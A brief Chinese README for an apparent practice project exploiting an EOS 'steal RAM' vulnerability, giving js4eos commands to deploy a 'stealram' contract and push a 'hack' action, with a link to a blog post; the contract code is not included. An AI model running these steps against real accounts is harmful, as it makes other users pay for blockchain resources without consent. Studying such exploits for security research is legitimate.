# Introduction(简介)
偷窃RAM漏洞2实践

# Operation(操作)
## 安装js4eos
```
npm install -g js4eos
```
```
js4eos set contract youraccount stealram
js4eos push action youraccount hack '["anyaccount", "data"]' -p youraccount
```
上面js4eos可以替换为cleos

# details(详情)
<a href="https://blog.csdn.net/ITleaks/article/details/85008008">
https://blog.csdn.net/ITleaks/article/details/85008008
</a>